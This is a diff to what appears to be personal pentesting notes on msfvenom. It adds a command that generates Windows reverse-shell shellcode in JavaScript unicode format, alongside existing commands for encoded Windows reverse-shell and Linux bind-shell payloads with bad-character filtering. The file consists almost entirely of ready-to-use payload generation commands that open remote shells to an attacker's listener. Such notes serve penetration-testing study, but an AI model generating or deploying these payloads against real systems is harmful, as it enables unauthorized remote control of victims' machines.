@@ -7,6 +7,12 @@ msfvenom -- allows you to generate shellcode
 -k make exploit run in new shell. Try to see if the program does not crash with option
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
+unicode format shell code for javascript
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.14.220 LPORT=443 -f js_le --platform windows -a x86 -e generic/none
+
 for linux
 
 msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" -- platform linux -a x86 -e x86/shikata_ga_nai
+
+
